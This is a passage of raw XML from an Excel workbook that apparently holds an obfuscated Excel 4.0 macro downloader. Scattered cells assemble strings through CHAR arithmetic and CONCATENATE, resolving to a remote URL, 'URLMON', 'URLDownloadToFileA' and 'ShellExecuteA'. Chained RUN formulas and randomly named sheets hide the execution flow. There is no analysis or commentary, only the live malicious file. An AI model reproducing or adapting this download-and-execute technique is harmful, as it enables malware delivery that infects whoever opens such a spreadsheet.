        <f>CONCATENATE($DV$1120,$DD$1983,$HR$252,$BE$337,$EV$1959,$K$1774,$W$1606,$Y$1444,$HJ$393,$GH$1029,$BK$697,$FE$1886,$ER$260,$Q$818,$IM$1320,$HA$893,$FN$602,$U$1990,$BP$627,$EG$572,$AT$531,$CB$559,$V$1580,$IF$1196,$DU$166,$V$1937,$BY$1055,$CI$1125,$EC$601)</f>
        <v>https://ludicrouslyl.at/3/dip</v>
      </c>
    </row>
    <row r="1569" spans="2:223" x14ac:dyDescent="0.25">
      <c r="FI1569" t="b">
        <f>RUN($GG$164)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1575" spans="2:223" x14ac:dyDescent="0.25">
      <c r="CB1575">
        <v>931</v>
      </c>
    </row>
    <row r="1576" spans="2:223" x14ac:dyDescent="0.25">
      <c r="B1576" t="str">
        <f>CONCATENATE($AB$1748)</f>
        <v>ShellExecuteA</v>
      </c>
      <c r="BC1576" t="str">
        <f>CHAR($HL$1116-158)</f>
        <v>R</v>
      </c>
    </row>
    <row r="1578" spans="2:223" x14ac:dyDescent="0.25">
      <c r="HO1578" t="b">
        <f>RUN($FI$769)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1580" spans="2:223" x14ac:dyDescent="0.25">
      <c r="V1580" t="str">
        <f>CHAR($EI$1115-885)</f>
        <v>t</v>
      </c>
    </row>
    <row r="1584" spans="2:223" x14ac:dyDescent="0.25">
      <c r="FD1584" t="b">
        <f>RUN($DJ$964)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1594" spans="27:200" x14ac:dyDescent="0.25">
      <c r="AA1594" t="b">
        <f>RUN($T$10)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1600" spans="27:200" x14ac:dyDescent="0.25">
      <c r="GR1600">
        <v>85</v>
      </c>
    </row>
    <row r="1603" spans="23:232" x14ac:dyDescent="0.25">
      <c r="AU1603">
        <v>206</v>
      </c>
    </row>
    <row r="1606" spans="23:232" x14ac:dyDescent="0.25">
      <c r="W1606" t="str">
        <f>CHAR($J$901-885)</f>
        <v>/</v>
      </c>
    </row>
    <row r="1613" spans="23:232" x14ac:dyDescent="0.25">
      <c r="HX1613" t="b">
        <f>RUN($FR$1895)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1623" spans="66:228" x14ac:dyDescent="0.25">
      <c r="HT1623">
        <v>234</v>
      </c>
    </row>
    <row r="1624" spans="66:228" x14ac:dyDescent="0.25">
      <c r="BN1624">
        <v>259</v>
      </c>
    </row>
    <row r="1628" spans="66:228" x14ac:dyDescent="0.25">
      <c r="BQ1628" t="str">
        <f>CHAR($BD$1064-158)</f>
        <v>t</v>
      </c>
    </row>
    <row r="1630" spans="66:228" x14ac:dyDescent="0.25">
      <c r="HS1630" t="b">
        <f>RUN($CB$1038)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1635" spans="169:169" x14ac:dyDescent="0.25">
      <c r="FM1635">
        <v>259</v>
      </c>
    </row>
    <row r="1654" spans="108:176" x14ac:dyDescent="0.25">
      <c r="DD1654">
        <v>997</v>
      </c>
    </row>
    <row r="1657" spans="108:176" x14ac:dyDescent="0.25">
      <c r="FT1657">
        <v>259</v>
      </c>
    </row>
    <row r="1674" spans="90:148" x14ac:dyDescent="0.25">
      <c r="ER1674" t="str">
        <f>CHAR($CS$1705-158)</f>
        <v>p</v>
      </c>
    </row>
    <row r="1675" spans="90:148" x14ac:dyDescent="0.25">
      <c r="CL1675">
        <v>607</v>
      </c>
    </row>
    <row r="1684" spans="166:219" x14ac:dyDescent="0.25">
      <c r="FJ1684" t="b">
        <f>RUN($N$1469)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1692" spans="166:219" x14ac:dyDescent="0.25">
      <c r="HK1692">
        <v>993</v>
      </c>
    </row>
    <row r="1698" spans="11:212" x14ac:dyDescent="0.25">
      <c r="BJ1698">
        <v>45</v>
      </c>
    </row>
    <row r="1699" spans="11:212" x14ac:dyDescent="0.25">
      <c r="AO1699" t="b">
        <f>RUN($H$1222)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1705" spans="11:212" x14ac:dyDescent="0.25">
      <c r="CS1705">
        <v>270</v>
      </c>
    </row>
    <row r="1710" spans="11:212" x14ac:dyDescent="0.25">
      <c r="K1710">
        <v>639</v>
      </c>
      <c r="HD1710" t="str">
        <f>CHAR($BD$1294-158)</f>
        <v>E</v>
      </c>
    </row>
    <row r="1711" spans="11:212" x14ac:dyDescent="0.25">
      <c r="BE1711">
        <v>259</v>
      </c>
    </row>
    <row r="1715" spans="144:232" x14ac:dyDescent="0.25">
      <c r="EN1715" t="b">
        <f>RUN($IC$300)</f>
        <v>0</v>
      </c>
      <c r="HX1715" t="str">
        <f>CHAR($FA$695-158)</f>
        <v>D</v>
      </c>
    </row>
    <row r="1729" spans="54:208" x14ac:dyDescent="0.25">
      <c r="FR1729">
        <v>170</v>
      </c>
    </row>
    <row r="1734" spans="54:208" x14ac:dyDescent="0.25">
      <c r="GL1734" t="str">
        <f>CONCATENATE($GP$411)</f>
        <v>URLDownloadToFileA</v>
      </c>
    </row>
    <row r="1735" spans="54:208" x14ac:dyDescent="0.25">
      <c r="BB1735">
        <v>635</v>
      </c>
    </row>
    <row r="1737" spans="54:208" x14ac:dyDescent="0.25">
      <c r="GZ1737">
        <v>255</v>
      </c>
    </row>
    <row r="1748" spans="28:121" x14ac:dyDescent="0.25">
      <c r="AB1748" t="str">
        <f>CONCATENATE($CO$1012,$HZ$1420,$IJ$711,$GM$1980,$EB$1548,$HD$1710,$HK$374,$DN$1791,$IK$1482,$EU$1965,$BQ$1628,$AY$799,$ID$50)</f>
        <v>ShellExecuteA</v>
      </c>
    </row>
    <row r="1750" spans="28:121" x14ac:dyDescent="0.25">
      <c r="DQ1750">
        <v>20</v>
      </c>
    </row>
    <row r="1757" spans="28:121" x14ac:dyDescent="0.25">
      <c r="BG1757" t="str">
        <f>CHAR($FU$1079-158)</f>
        <v>t</v>
      </c>
    </row>
    <row r="1761" spans="11:123" x14ac:dyDescent="0.25">
      <c r="DS1761">
        <v>72</v>
      </c>
    </row>
    <row r="1767" spans="11:123" x14ac:dyDescent="0.25">
      <c r="CA1767">
        <v>1001</v>
      </c>
    </row>
    <row r="1774" spans="11:123" x14ac:dyDescent="0.25">
      <c r="K1774" t="str">
        <f>CHAR($FH$354-885)</f>
        <v>:</v>
      </c>
    </row>
    <row r="1779" spans="80:156" x14ac:dyDescent="0.25">
      <c r="EZ1779" t="b">
        <f>RUN($GW$42)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1783" spans="80:156" x14ac:dyDescent="0.25">
      <c r="CB1783" t="b">
        <f>RUN($DR$538)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1791" spans="80:156" x14ac:dyDescent="0.25">
      <c r="DN1791" t="str">
        <f>CHAR($BN$1624-158)</f>
        <v>e</v>
      </c>
    </row>
    <row r="1800" spans="91:91" x14ac:dyDescent="0.25">
      <c r="CM1800" t="b">
        <f>RUN($CF$302)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1809" spans="1:242" x14ac:dyDescent="0.25">
      <c r="AR1809" t="str">
        <f>CHAR($CL$1675-557)</f>
        <v>2</v>
      </c>
    </row>
    <row r="1812" spans="1:242" x14ac:dyDescent="0.25">
      <c r="IC1812">
        <v>636</v>
      </c>
    </row>
    <row r="1814" spans="1:242" x14ac:dyDescent="0.25">
      <c r="D1814" t="str">
        <f>CHAR($AG$1468-102)</f>
        <v>C</v>
      </c>
    </row>
    <row r="1817" spans="1:242" x14ac:dyDescent="0.25">
      <c r="CS1817" t="b">
        <f>RUN($AK$643)</f>
        <v>0</v>
      </c>
      <c r="FJ1817">
        <v>279</v>
      </c>
    </row>
    <row r="1822" spans="1:242" x14ac:dyDescent="0.25">
      <c r="A1822" t="str">
        <f>CONCATENATE($IE$1204)</f>
        <v>URLMON</v>
      </c>
    </row>
    <row r="1823" spans="1:242" x14ac:dyDescent="0.25">
      <c r="CE1823" t="str">
        <f>CHAR($BL$983-557)</f>
        <v>e</v>
      </c>
    </row>
    <row r="1824" spans="1:242" x14ac:dyDescent="0.25">
      <c r="IH1824" t="str">
        <f>CHAR($CV$1826-158)</f>
        <v>T</v>
      </c>
    </row>
    <row r="1826" spans="100:165" x14ac:dyDescent="0.25">
      <c r="CV1826">
        <v>242</v>
      </c>
    </row>
    <row r="1827" spans="100:165" x14ac:dyDescent="0.25">
      <c r="DQ1827" t="b">
        <f>RUN($EN$1715)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1840" spans="100:165" x14ac:dyDescent="0.25">
      <c r="FI1840">
        <v>210</v>
      </c>
    </row>
    <row r="1842" spans="180:180" x14ac:dyDescent="0.25">
      <c r="FX1842">
        <v>183</v>
      </c>
    </row>
    <row r="1857" spans="31:180" x14ac:dyDescent="0.25">
      <c r="FV1857">
        <v>633</v>
      </c>
    </row>
    <row r="1859" spans="31:180" x14ac:dyDescent="0.25">
      <c r="FM1859">
        <v>990</v>
      </c>
    </row>
    <row r="1861" spans="31:180" x14ac:dyDescent="0.25">
      <c r="BR1861">
        <v>90</v>
      </c>
    </row>
    <row r="1862" spans="31:180" x14ac:dyDescent="0.25">
      <c r="DJ1862" t="b">
        <f>RUN($GV$988)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1865" spans="31:180" x14ac:dyDescent="0.25">
      <c r="AE1865" t="b">
        <f>RUN($O$1530)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1870" spans="31:180" x14ac:dyDescent="0.25">
      <c r="FX1870" t="str">
        <f>CHAR($BW$606-102)</f>
        <v>\</v>
      </c>
    </row>
    <row r="1871" spans="31:180" x14ac:dyDescent="0.25">
      <c r="BD1871" t="str">
        <f>CHAR($IA$338-158)</f>
        <v>l</v>
      </c>
    </row>
    <row r="1881" spans="161:172" x14ac:dyDescent="0.25">
      <c r="FP1881">
        <v>1</v>
      </c>
    </row>
    <row r="1886" spans="161:172" x14ac:dyDescent="0.25">
      <c r="FE1886" t="str">
        <f>CHAR($BJ$1889-885)</f>
        <v>i</v>
      </c>
    </row>
    <row r="1889" spans="62:174" x14ac:dyDescent="0.25">
      <c r="BJ1889">
        <v>990</v>
      </c>
    </row>
    <row r="1895" spans="62:174" x14ac:dyDescent="0.25">
      <c r="FR1895" t="b">
        <f>RUN($EA$569)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1907" spans="10:208" x14ac:dyDescent="0.25">
      <c r="DR1907" t="b">
        <f>RUN($GJ$1306)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1908" spans="10:208" x14ac:dyDescent="0.25">
      <c r="J1908">
        <v>272</v>
      </c>
    </row>
    <row r="1910" spans="10:208" x14ac:dyDescent="0.25">
      <c r="GZ1910" t="str">
        <f>CHAR($HZ$668-557)</f>
        <v>h</v>
      </c>
    </row>
    <row r="1912" spans="10:208" x14ac:dyDescent="0.25">
      <c r="EM1912" t="b">
        <f>RUN($CA$847)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1917" spans="10:208" x14ac:dyDescent="0.25">
      <c r="GH1917">
        <v>21</v>
      </c>
    </row>
    <row r="1922" spans="28:151" x14ac:dyDescent="0.25">
      <c r="EU1922">
        <v>257</v>
      </c>
    </row>
    <row r="1926" spans="28:151" x14ac:dyDescent="0.25">
      <c r="DU1926" t="str">
        <f>CHAR($J$1908-158)</f>
        <v>r</v>
      </c>
    </row>
    <row r="1928" spans="28:151" x14ac:dyDescent="0.25">
      <c r="AB1928">
        <v>59</v>
      </c>
    </row>
    <row r="1934" spans="28:151" x14ac:dyDescent="0.25">
      <c r="CX1934">
        <v>607</v>
      </c>
    </row>
    <row r="1936" spans="28:151" x14ac:dyDescent="0.25">
      <c r="CY1936" t="str">
        <f>CHAR($CU$1196-158)</f>
        <v>o</v>
      </c>
    </row>
    <row r="1937" spans="22:188" x14ac:dyDescent="0.25">
      <c r="V1937" t="str">
        <f>CHAR($DD$906-885)</f>
        <v>/</v>
      </c>
    </row>
    <row r="1940" spans="22:188" x14ac:dyDescent="0.25">
      <c r="GF1940" t="str">
        <f>CHAR($FV$1857-557)</f>
        <v>L</v>
      </c>
    </row>
    <row r="1946" spans="22:188" x14ac:dyDescent="0.25">
      <c r="EZ1946">
        <v>642</v>
      </c>
    </row>
    <row r="1950" spans="22:188" x14ac:dyDescent="0.25">
      <c r="BQ1950" t="b">
        <f>RUN($FJ$1013)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1954" spans="94:176" x14ac:dyDescent="0.25">
      <c r="CP1954" t="str">
        <f>CHAR($DR$134-102)</f>
        <v>\</v>
      </c>
    </row>
    <row r="1959" spans="94:176" x14ac:dyDescent="0.25">
      <c r="EV1959" t="str">
        <f>CHAR($DK$1259-885)</f>
        <v>s</v>
      </c>
    </row>
    <row r="1961" spans="94:176" x14ac:dyDescent="0.25">
      <c r="FT1961">
        <v>277</v>
      </c>
    </row>
    <row r="1965" spans="94:176" x14ac:dyDescent="0.25">
      <c r="EU1965" t="str">
        <f>CHAR($AR$957-158)</f>
        <v>u</v>
      </c>
    </row>
    <row r="1969" spans="15:217" x14ac:dyDescent="0.25">
      <c r="V1969">
        <v>266</v>
      </c>
    </row>
    <row r="1972" spans="15:217" x14ac:dyDescent="0.25">
      <c r="FL1972" t="b">
        <f>RUN($AA$1594)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1973" spans="15:217" x14ac:dyDescent="0.25">
      <c r="CK1973">
        <v>989</v>
      </c>
      <c r="FG1973">
        <v>263</v>
      </c>
    </row>
    <row r="1979" spans="15:217" x14ac:dyDescent="0.25">
      <c r="O1979" t="b">
        <f>RUN($GW$1554)</f>
        <v>0</v>
      </c>
      <c r="HI1979" t="str">
        <f>CHAR($HD$1482-158)</f>
        <v>A</v>
      </c>
    </row>
    <row r="1980" spans="15:217" x14ac:dyDescent="0.25">
      <c r="GM1980" t="str">
        <f>CHAR($V$1969-158)</f>
        <v>l</v>
      </c>
    </row>
    <row r="1981" spans="15:217" x14ac:dyDescent="0.25">
      <c r="HC1981">
        <v>237</v>
      </c>
    </row>
    <row r="1983" spans="15:217" x14ac:dyDescent="0.25">
      <c r="DD1983" t="str">
        <f>CHAR($CL$1016-885)</f>
        <v>t</v>
      </c>
    </row>
    <row r="1984" spans="15:217" x14ac:dyDescent="0.25">
      <c r="HE1984">
        <v>188</v>
      </c>
    </row>
    <row r="1990" spans="21:225" x14ac:dyDescent="0.25">
      <c r="U1990" t="str">
        <f>CHAR($HJ$1025-885)</f>
        <v>l</v>
      </c>
      <c r="HQ1990">
        <v>257</v>
      </c>
    </row>
  </sheetData>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3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9:IN1986"/>
  <sheetViews>
    <sheetView workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="29" spans="198:198" x14ac:dyDescent="0.25">
      <c r="GP29" t="s">
        <v>59</v>
      </c>
    </row>
    <row r="47" spans="152:152" x14ac:dyDescent="0.25">
      <c r="EV47" t="s">
        <v>10</v>
      </c>
    </row>
    <row r="49" spans="49:69" x14ac:dyDescent="0.25">
      <c r="AW49" t="s">
        <v>71</v>
      </c>
    </row>
    <row r="50" spans="49:69" x14ac:dyDescent="0.25">
      <c r="BQ50" t="s">
        <v>70</v>
      </c>
    </row>
    <row r="68" spans="115:184" x14ac:dyDescent="0.25">
      <c r="GB68" t="s">
        <v>68</v>
      </c>
    </row>
    <row r="72" spans="115:184" x14ac:dyDescent="0.25">
      <c r="DK72" t="s">
        <v>49</v>
      </c>
    </row>
    <row r="88" spans="113:113" x14ac:dyDescent="0.25">
      <c r="DI88" t="s">
        <v>64</v>
      </c>
    </row>
    <row r="107" spans="240:240" x14ac:dyDescent="0.25">
      <c r="IF107" t="s">
        <v>41</v>
      </c>
    </row>
    <row r="126" spans="248:248" x14ac:dyDescent="0.25">
      <c r="IN126" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="218" spans="228:228" x14ac:dyDescent="0.25">
      <c r="HT218" t="s">
        <v>29</v>
      </c>
    </row>
    <row r="226" spans="9:9" x14ac:dyDescent="0.25">
      <c r="I226" t="s">
        <v>58</v>
      </c>
    </row>
    <row r="247" spans="14:14" x14ac:dyDescent="0.25">
      <c r="N247" t="s">
        <v>24</v>
      </c>
    </row>
    <row r="260" spans="54:54" x14ac:dyDescent="0.25">
      <c r="BB260" t="s">
        <v>45</v>
      </c>
    </row>
    <row r="296" spans="95:95" x14ac:dyDescent="0.25">
      <c r="CQ296" t="s">
        <v>78</v>
      </c>
    </row>
    <row r="367" spans="137:137" x14ac:dyDescent="0.25">
      <c r="EG367" t="s">
        <v>76</v>
      </c>
    </row>
    <row r="390" spans="102:220" x14ac:dyDescent="0.25">
      <c r="CX390" t="s">
        <v>36</v>
      </c>
    </row>
    <row r="396" spans="102:220" x14ac:dyDescent="0.25">
      <c r="HL396" t="s">
        <v>42</v>
      </c>
    </row>
    <row r="417" spans="56:56" x14ac:dyDescent="0.25">
      <c r="BD417" t="s">
        <v>14</v>
      </c>
    </row>
    <row r="435" spans="66:66" x14ac:dyDescent="0.25">
      <c r="BN435" t="s">
        <v>43</v>
      </c>
    </row>
    <row r="460" spans="52:52" x14ac:dyDescent="0.25">
      <c r="AZ460" t="s">
        <v>34</v>
      </c>
    </row>
    <row r="482" spans="227:227" x14ac:dyDescent="0.25">
      <c r="HS482" t="s">
        <v>31</v>
      </c>
    </row>
    <row r="506" spans="184:184" x14ac:dyDescent="0.25">
      <c r="GB506" t="s">
        <v>35</v>
      </c>
    </row>
    <row r="519" spans="41:185" x14ac:dyDescent="0.25">
      <c r="FK519" t="s">
        <v>55</v>
      </c>
    </row>
    <row r="524" spans="41:185" x14ac:dyDescent="0.25">
      <c r="AO524" t="s">
        <v>60</v>
      </c>
      <c r="GC524" t="s">
        <v>48</v>
      </c>
    </row>
    <row r="562" spans="176:181" x14ac:dyDescent="0.25">
      <c r="FT562" t="s">
        <v>32</v>
      </c>
    </row>
    <row r="564" spans="176:181" x14ac:dyDescent="0.25">
      <c r="FY564" t="s">
        <v>61</v>
      </c>
    </row>
    <row r="577" spans="44:105" x14ac:dyDescent="0.25">
      <c r="AR577" t="s">
        <v>52</v>
      </c>
    </row>
    <row r="579" spans="44:105" x14ac:dyDescent="0.25">
      <c r="DA579" t="s">
        <v>73</v>
      </c>
    </row>
    <row r="608" spans="186:186" x14ac:dyDescent="0.25">
      <c r="GD608" t="s">
        <v>4</v>
      </c>
    </row>
    <row r="660" spans="162:219" x14ac:dyDescent="0.25">
      <c r="HK660" t="s">
        <v>69</v>
      </c>
    </row>
    <row r="664" spans="162:219" x14ac:dyDescent="0.25">
      <c r="FF664" t="s">
        <v>56</v>
      </c>
    </row>
    <row r="679" spans="244:244" x14ac:dyDescent="0.25">
      <c r="IJ679" t="s">
        <v>54</v>
      </c>
    </row>
    <row r="715" spans="239:239" x14ac:dyDescent="0.25">
      <c r="IE715" t="s">
        <v>23</v>
      </c>
    </row>
    <row r="726" spans="1:1" x14ac:dyDescent="0.25">
      <c r="A726" t="s">
        <v>66</v>
      </c>
    </row>
    <row r="789" spans="213:213" x14ac:dyDescent="0.25">
      <c r="HE789" t="s">
        <v>30</v>
      </c>
    </row>
    <row r="802" spans="19:19" x14ac:dyDescent="0.25">
      <c r="S802" t="s">
        <v>13</v>
      </c>
    </row>
    <row r="871" spans="15:15" x14ac:dyDescent="0.25">
      <c r="O871" t="s">
        <v>72</v>
      </c>
    </row>
    <row r="891" spans="124:124" x14ac:dyDescent="0.25">
      <c r="DT891" t="s">
        <v>27</v>
      </c>
    </row>
    <row r="903" spans="62:206" x14ac:dyDescent="0.25">
      <c r="BJ903" t="s">
        <v>15</v>
      </c>
    </row>
    <row r="912" spans="62:206" x14ac:dyDescent="0.25">
      <c r="GX912" t="s">
        <v>6</v>
      </c>
    </row>
    <row r="915" spans="14:14" x14ac:dyDescent="0.25">
      <c r="N915" t="s">
        <v>53</v>
      </c>
    </row>
    <row r="983" spans="102:135" x14ac:dyDescent="0.25">
      <c r="CX983" t="s">
        <v>50</v>
      </c>
      <c r="EE983" t="s">
        <v>20</v>
      </c>
    </row>
    <row r="1004" spans="174:174" x14ac:dyDescent="0.25">
      <c r="FR1004" t="s">
        <v>21</v>
      </c>
    </row>
    <row r="1053" spans="226:226" x14ac:dyDescent="0.25">
      <c r="HR1053" t="s">
        <v>1</v>
      </c>
    </row>
    <row r="1090" spans="65:94" x14ac:dyDescent="0.25">
      <c r="CP1090" t="s">
        <v>25</v>
      </c>
    </row>
    <row r="1099" spans="65:94" x14ac:dyDescent="0.25">
      <c r="BM1099" t="s">
        <v>5</v>
      </c>
    </row>
    <row r="1131" spans="62:131" x14ac:dyDescent="0.25">
      <c r="EA1131" t="s">
        <v>16</v>
      </c>
    </row>
    <row r="1132" spans="62:131" x14ac:dyDescent="0.25">
      <c r="BJ1132" t="s">
        <v>65</v>
      </c>
    </row>
    <row r="1169" spans="183:228" x14ac:dyDescent="0.25">
      <c r="HT1169" t="s">
        <v>47</v>
      </c>
    </row>
    <row r="1170" spans="183:228" x14ac:dyDescent="0.25">
      <c r="GA1170" t="s">
        <v>7</v>
      </c>
    </row>
    <row r="1181" spans="183:228" x14ac:dyDescent="0.25">
      <c r="HC1181" t="s">
        <v>12</v>
      </c>
    </row>
    <row r="1206" spans="85:85" x14ac:dyDescent="0.25">
      <c r="CG1206" t="s">
        <v>2</v>
      </c>
    </row>
    <row r="1236" spans="186:186" x14ac:dyDescent="0.25">
      <c r="GD1236" t="s">
        <v>40</v>
      </c>
    </row>
    <row r="1253" spans="41:41" x14ac:dyDescent="0.25">
      <c r="AO1253" t="s">
        <v>28</v>
      </c>
    </row>
    <row r="1305" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1305" t="s">
        <v>37</v>
      </c>
    </row>
    <row r="1354" spans="150:150" x14ac:dyDescent="0.25">
      <c r="ET1354" t="s">
        <v>33</v>
      </c>
    </row>
    <row r="1438" spans="74:74" x14ac:dyDescent="0.25">
      <c r="BV1438" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="1455" spans="112:112" x14ac:dyDescent="0.25">
      <c r="DH1455" t="s">
        <v>26</v>
      </c>
    </row>
    <row r="1474" spans="157:157" x14ac:dyDescent="0.25">
      <c r="FA1474" t="s">
        <v>19</v>
      </c>
    </row>
    <row r="1509" spans="240:240" x14ac:dyDescent="0.25">
      <c r="IF1509" t="s">
        <v>57</v>
      </c>
    </row>
    <row r="1558" spans="12:12" x14ac:dyDescent="0.25">
      <c r="L1558" t="s">
        <v>38</v>
      </c>
    </row>
    <row r="1581" spans="177:177" x14ac:dyDescent="0.25">
      <c r="FU1581" t="s">
        <v>75</v>
      </c>
    </row>
    <row r="1678" spans="248:248" x14ac:dyDescent="0.25">
      <c r="IN1678" t="s">
        <v>62</v>
      </c>
    </row>
    <row r="1705" spans="109:109" x14ac:dyDescent="0.25">
      <c r="DE1705" t="s">
        <v>22</v>
      </c>
    </row>
    <row r="1724" spans="135:135" x14ac:dyDescent="0.25">
      <c r="EE1724" t="s">
        <v>17</v>
      </c>
    </row>
    <row r="1734" spans="125:218" x14ac:dyDescent="0.25">
      <c r="DU1734" t="s">
        <v>11</v>
      </c>
    </row>
    <row r="1743" spans="125:218" x14ac:dyDescent="0.25">
      <c r="HJ1743" t="s">
        <v>39</v>
      </c>
    </row>
    <row r="1768" spans="176:176" x14ac:dyDescent="0.25">
      <c r="FT1768" t="s">
        <v>67</v>
      </c>
    </row>
    <row r="1783" spans="163:224" x14ac:dyDescent="0.25">
      <c r="HP1783" t="s">
        <v>0</v>
      </c>
    </row>
    <row r="1787" spans="163:224" x14ac:dyDescent="0.25">
      <c r="FG1787" t="s">
        <v>77</v>
      </c>
    </row>
    <row r="1797" spans="47:47" x14ac:dyDescent="0.25">
      <c r="AU1797" t="s">
        <v>8</v>
      </c>
    </row>
    <row r="1818" spans="94:94" x14ac:dyDescent="0.25">
      <c r="CP1818" t="s">
        <v>46</v>
      </c>
    </row>
    <row r="1905" spans="77:77" x14ac:dyDescent="0.25">
      <c r="BY1905" t="s">
        <v>18</v>
      </c>
    </row>
    <row r="1935" spans="85:85" x14ac:dyDescent="0.25">
      <c r="CG1935" t="s">
        <v>74</v>
      </c>
    </row>
    <row r="1968" spans="13:13" x14ac:dyDescent="0.25">
      <c r="M1968" t="s">
        <v>44</v>
      </c>
    </row>
    <row r="1982" spans="15:15" x14ac:dyDescent="0.25">
      <c r="O1982" t="s">
        <v>51</v>
      </c>
    </row>
    <row r="1986" spans="210:210" x14ac:dyDescent="0.25">
      <c r="HB1986" t="s">
        <v>63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workbookViewId="0"/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Excel 4.0 Macros</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="21" baseType="lpstr">
      <vt:lpstr>PUcSxHHFKhovammCG</vt:lpstr>
      <vt:lpstr>Sheet3</vt:lpstr>
      <vt:lpstr>Sheet4</vt:lpstr>
      <vt:lpstr>Sheet5</vt:lpstr>
      <vt:lpstr>Sheet6</vt:lpstr>
      <vt:lpstr>Sheet7</vt:lpstr>
      <vt:lpstr>Sheet8</vt:lpstr>
      <vt:lpstr>Sheet9</vt:lpstr>
      <vt:lpstr>Sheet10</vt:lpstr>
      <vt:lpstr>Sheet11</vt:lpstr>
      <vt:lpstr>Sheet12</vt:lpstr>
      <vt:lpstr>Sheet13</vt:lpstr>
      <vt:lpstr>Sheet14</vt:lpstr>
      <vt:lpstr>Sheet15</vt:lpstr>
      <vt:lpstr>Sheet16</vt:lpstr>
      <vt:lpstr>Sheet17</vt:lpstr>
      <vt:lpstr>Sheet18</vt:lpstr>
      <vt:lpstr>Sheet19</vt:lpstr>
      <vt:lpstr>Sheet20</vt:lpstr>
      <vt:lpstr>Sheet1</vt:lpstr>
      <vt:lpstr>OJxSJzNYHGtfHdpEl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2020-05-18T18:30:22Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2020-05-18T18:38:49Z</dcterms:modified>
</cp:coreProperties>
</file>